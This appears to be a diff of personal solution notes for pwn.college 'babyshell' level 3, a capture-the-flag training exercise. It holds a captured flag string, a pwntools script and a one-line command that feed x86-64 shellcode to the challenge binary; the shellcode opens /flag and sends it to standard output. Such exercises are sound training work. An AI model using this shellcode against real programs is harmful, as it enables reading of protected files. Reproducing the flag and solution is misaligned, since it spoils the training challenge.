@@ -233,44 +233,78 @@ flag=pwn.college{gDBurPf4kUtqmbvJjYddeAa2cDA.QX4EjMsADOzQzW}
                
                level 3
                
-//not the solution
+//https://github.com/memzer0x/xorausaurus.github.io/blob/b087ec2423b43532cb17a7c03dbe542a4e5cd194/pwn-college-babyshell-level3.md
 from pwn import *
 
-# set some context
 context.arch = "amd64"
 context.encoding = "latin"
-# ignore warnings
+
 warnings.simplefilter("ignore")
 
-# assembly goes here, most of the rest is boilerplate
+
 assembly = """
-    movabs  rbx, 0x67616c662f
-    push    rbx
-        
-    mov     rdx, 0x400
-    mov     rsi, 0x0
-    mov     rdi, rsp
-    mov     rax, 0x2
-    syscall    
-    
-    mov     r10, 0x3e8
-    mov     rdx, 0x0
-    mov     rsi, rax
-    mov     rdi, 0x1
-    mov     rax, 0x28
-    syscall
-    
-    mov     rdi, 0x0
-    mov     rax, 0x3c
-    syscall
+	xor rsi, rsi 			
+	mov ebx, 0x67616c66		
+	shl rbx, 8				
+	mov bl, 0x2f			
+	push rbx				
+	mov rdi, rsp			
+	mov rax, 2				
+	syscall					
+
+	
+	push 1					
+	pop rdi					
+	push rax				
+	pop rsi 				
+	push 0					
+	pop rdx					
+	push 1024				
+	pop r10					
+	push 40					
+	pop rax					
+	syscall 				
+
+	
+	push 60 				
+	pop rax					
+	push 69					
+	pop rdi					
+	syscall
 """
 
-# the hostname will always be the same as challenge binary
 with process(f"/challenge/{os.getenv('HOSTNAME')}") as target:
     info( target.readrepeat(1) )
     target.send( asm(assembly) )
     info( target.readrepeat(1) )
 
 
+asm -c amd64 "xor rsi, rsi
+  xor rdx, rdx
+  mov ebx, 0x67616c66
+  shl rbx, 8				
+	mov bl, 0x2f			
+	push rbx				
+	mov rdi, rsp			
+	mov rax, 2
+	syscall					
 
+	
+	push 1					
+	pop rdi					
+	push rax
+  pop rsi
+  xor rdx, rdx				
+	push 1024				
+	pop r10					
+	push 40					
+	pop rax					
+	syscall 				
+
+	
+	push 60 				
+	pop rax					
+	push 69					
+	pop rdi					
+	syscall" | /challenge/babyshell_level3
 
